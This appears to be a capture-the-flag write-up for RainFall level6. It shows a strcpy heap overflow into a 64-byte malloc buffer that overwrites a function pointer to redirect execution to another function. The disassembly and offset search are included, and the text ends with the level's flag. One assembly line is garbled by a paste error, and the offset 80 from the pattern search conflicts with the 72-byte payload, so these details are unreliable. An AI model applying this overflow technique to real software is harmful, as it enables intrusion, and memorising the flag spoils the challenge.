@@ -1,0 +1,122 @@
+so let's try to start the program 
+
+so without argument is create segfault but with argument is just put nope 
+
+level6@RainFall:~$ ./level6
+Segmentation fault (core dumped)
+level6@RainFall:~$ ./level6 a
+Nope
+level6@RainFall:~$ ./level6 b
+Nope
+
+
+so let's decompile and find some expoitation 
+
+disass *main
+
+gef➤  disassemble *main
+Dump of assembler code for function main:
+   0x0804847c <+0>:	push   ebp
+   0x0804847d <+1>:	mov    ebp,esp
+   0x0804847f <+3>:	and    esp,0xfffffff0
+   0x08048482 <+6>:	sub    esp,0x20
+   0x08048485 <+9>:	mov    DWORD PTR [esp],0x40
+   0x0804848c <+16>:	call   0x8048350 <malloc@plt>
+   0x08048491 <+21>:	mov    DWORD PTR [esp+0x1c],eax
+   0x08048495 <+25>:	mov    DWORD PTR [esp],0x4
+   0x0804849c <+32>:	call   0x8048350 <malloc@plt>
+   0x080484a1 <+37>:	mov    DWORD PTR [esp+0x18],eax
+   0x080484a5 <+41>:	mov    edx,0x8048468
+   0x080484aa <+46>:	mov    eax,DWORD PTR [esp+0x18]
+   0x080484ae <+50>:	mov    DWORD PTR [eax],edx
+   0x080484b0 <+52>:	mov    eax,DWORD PTR [ebp+0xc]
+   0x080484b3 <+55>:	add    eax,0x4
+   0x080484b6 <+58>:	mov    eax,DWORD PTR [eax]
+   0x080484b8 <+60>:	mov    edx,eax
+   0x080484ba <+62>:	mov    eax,DWORD PTR [esp+0x1c]
+   0x080484be <+66   0x080484a5 <+41>:	mov    edx,0x8048468>:	mov    DWORD PTR [esp+0x4],edx
+   0x080484c2 <+70>:	mov    DWORD PTR [esp],eax
+   0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
+   0x080484ca <+78>:	mov    eax,DWORD PTR [esp+0x18]
+   0x080484ce <+82>:	mov    eax,DWORD PTR [eax]
+   0x080484d0 <+84>:	call   eax
+   0x080484d2 <+86>:	leave  
+   0x080484d3 <+87>:	ret    
+End of assembler dump.
+gef➤  
+
+
+so is create a reference in of the function m in 
+0x08048454  n
+0x08048468  m
+
+   0x080484a5 <+41>:	mov    edx,0x8048468
+   0x080484aa <+46>:	mov    eax,DWORD PTR [esp+0x18]
+   0x080484ae <+50>:	mov    DWORD PTR [eax],edx
+
+
+and after is all this function at  esp + 0x18
+
+
+   0x080484ca <+78>:	mov    eax,DWORD PTR [esp+0x18]
+   0x080484ce <+82>:	mov    eax,DWORD PTR [eax]
+   0x080484d0 <+84>:	call   eax
+
+
+but how to exploit ? 
+
+is look this really not secure code :
+   0x080484b0 <+52>:	mov    eax,DWORD PTR [ebp+0xc]
+   0x080484b3 <+55>:	add    eax,0x4
+   0x080484b6 <+58>:	mov    eax,DWORD PTR [eax]
+   0x080484b8 <+60>:	mov    edx,eax
+   0x080484ba <+62>:	mov    eax,DWORD PTR [esp+0x1c]
+   0x080484be <+66   0x080484a5 <+41>:	mov    edx,0x8048468>:	mov    DWORD PTR [esp+0x4],edx
+   0x080484c2 <+70>:	mov    DWORD PTR [esp],eax
+   0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
+
+
+   so is get the argv with 
+   0x080484b0 <+52>:	mov    eax,DWORD PTR [ebp+0xc]
+
+   and get the frist argument 
+   0x080484b3 <+55>:	add    eax,0x4
+
+   after is store the value in edx and put in esp for argument of strcpy
+
+   and get the buffer from malloc at [esp+0x1c]
+   0x080484ba <+62>:	mov    eax,DWORD PTR [esp+0x1c]
+   0x080484c2 <+70>:	mov    DWORD PTR [esp],eax
+   0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
+
+
+and the buffer off the var [esp + 0x1c ] is 0x40 
+   0x08048485 <+9>:	mov    DWORD PTR [esp],0x40
+   0x0804848c <+16>:	call   0x8048350 <malloc@plt>
+   0x08048491 <+21>:	mov    DWORD PTR [esp+0x1c],eax
+
+
+   here you have so exploitation because strcpy copy until is reach the 0x0 octet from the source 
+
+
+   lets try to find the offset for buffer 
+
+   pattern create 128
+
+
+   ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤  pattern search $eip
+[+] Searching for '75616161'/'61616175' with period=4
+[+] Found at offset 80 (little-endian search) likely
+
+
+so the offset is 80
+
+so let's try to exploit
+payload => 
+
+
+buffer overflow 72 bytes + address of function n
+
+and found the flag !
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
